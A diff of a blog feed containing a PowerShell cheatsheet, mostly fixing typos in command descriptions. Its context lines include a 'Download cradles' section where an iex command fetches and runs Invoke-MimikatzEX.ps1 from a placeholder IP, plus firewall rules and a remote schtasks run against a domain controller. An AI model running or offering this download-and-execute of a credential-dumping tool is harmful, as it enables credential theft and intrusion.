@@ -18,8 +18,8 @@
             <description>This cheatsheet will continue to receive updates.
 PowerShell (PS) 101 commands  Please note that all of the following commands are run from a PowerShell prompt.
 Retrieve the PowerShell Version
-$PSVersionTable List help about a cmdlet in a readable format:
-Get-Help &amp;lt;cmdlet&amp;gt; | more List cmdlets which contain the keyword &amp;lsquo;service&amp;rsquo; in them:
+$PSVersionTable List help about a cmdlet in a readable format
+Get-Help &amp;lt;cmdlet&amp;gt; | more List cmdlets which contain the keyword &amp;lsquo;service&amp;rsquo; in them
 Get-Command -CommandType Cmdlet | ?{$_.Name -match &amp;#34;service&amp;#34;} List available commands in the current PS session and their respective details which contain the keyword &amp;lsquo;command&amp;rsquo; in them:</description>
             <content type="html"><![CDATA[<p>This cheatsheet will continue to receive updates.</p>
 <h2 id="powershell-ps-101-commands">PowerShell (PS) 101 commands</h2>
@@ -27,19 +27,19 @@ Get-Command -CommandType Cmdlet | ?{$_.Name -match &amp;#34;service&amp;#34;} Li
 <p>Please note that all of the following commands are run from a PowerShell prompt.</p>
 <p>Retrieve the PowerShell Version</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"> $PSVersionTable 
-</code></pre></div><p>List help about a cmdlet in a readable format:</p>
+</code></pre></div><p>List help about a cmdlet in a readable format</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-Help &lt;cmdlet&gt; | more
-</code></pre></div><p>List cmdlets which contain the keyword &lsquo;service&rsquo; in them:</p>
+</code></pre></div><p>List cmdlets which contain the keyword &lsquo;service&rsquo; in them</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-Command -CommandType Cmdlet | ?{$_.Name <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#34;service&#34;</span>}
 </code></pre></div><p>List available commands in the current PS session and their respective details which contain the keyword &lsquo;command&rsquo; in them:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-Command -CommandType All -ShowCommandInfo | ?{$_.Name <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#34;command&#34;</span>}
-</code></pre></div><p>Wilcards can be used to match as well. Example:</p>
+</code></pre></div><p>Wildcards can be used to match as well.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-Command -CommandType All | ?{$_.Name <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#34;serv*&#34;</span>}
-</code></pre></div><p>Count the number of commands in the output:</p>
+</code></pre></div><p>Count the number of commands in the output</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">(Get-Command -CommandType All | ?{$_.Name <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#34;command&#34;</span>}).count
 </code></pre></div><p>List all cmdlets with PKI as source</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-Command -CommandType Cmdlet | ?{$_.Source <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#34;PKI&#34;</span>}
-</code></pre></div><p>List all commands in a module by running:</p>
+</code></pre></div><p>List all commands in a module by running</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-Command -Module &lt;module name&gt;
 </code></pre></div><h2 id="handy-tweaks">Handy Tweaks</h2>
 <hr>
@@ -62,7 +62,7 @@ Set-location &lt;Desired Path&gt;
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">New-NetFirewallRule -DisplayName <span style="color:#e6db74">&#39;HTTP-Inbound&#39;</span> -Profile @(<span style="color:#e6db74">&#39;Domain&#39;</span>, <span style="color:#e6db74">&#39;Private&#39;</span>) -Direction Inbound -Action Allow -Protocol TCP -LocalPort @(<span style="color:#e6db74">&#39;80&#39;</span>, <span style="color:#e6db74">&#39;443&#39;</span>)
 
 New-NetFirewallRule -DisplayName <span style="color:#e6db74">&#39;447-Inbound&#39;</span> -Profile @(<span style="color:#e6db74">&#39;Domain&#39;</span>, <span style="color:#e6db74">&#39;Private&#39;</span>) -Direction Inbound -Action Allow -Protocol TCP -LocalPort @(<span style="color:#e6db74">&#39;447&#39;</span>)
-</code></pre></div><h3 id="downlaod-cradles">Downlaod cradles</h3>
+</code></pre></div><h3 id="download-cradles">Download cradles</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># Option 1 - Using IEX (compatible with older versions of PS)</span>
 
 powershell iex (New-Object Net.WebClient).DownloadString(<span style="color:#e6db74">&#34;http://192.168.X.X/Invoke-MimikatzEX.ps1&#34;</span>)
@@ -116,7 +116,7 @@ schtasks /Run /S dc.contoso.local /TN <span style="color:#e6db74">&#34;UserX&#34
 </code></pre></div><h2 id="playing-with-command-output">Playing with command output</h2>
 <hr>
 <h3 id="1-expand-redacted-output">1. Expand redacted output</h3>
-<p>You might notice that sometimes the output returnmed by PS commands is redacted with &ldquo;&hellip;&rdquo;. This can be corrected by modifying the value of the PS variable - <code>$FormatEnumerationLimit</code> as follows.</p>
+<p>You might notice that sometimes the output returned by PS commands is redacted with &ldquo;&hellip;&rdquo;. This can be corrected by modifying the value of the PS variable - <code>$FormatEnumerationLimit</code> as follows.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$FormatEnumerationLimit = -1
 </code></pre></div><h3 id="2-using-more-command">2. Using &lsquo;more&rsquo; command</h3>
 <p>Piping output of a command to <code>more</code> command makes it readable from the first line. This is equivalent to <code> less</code> command in Linux/Unix.</p>
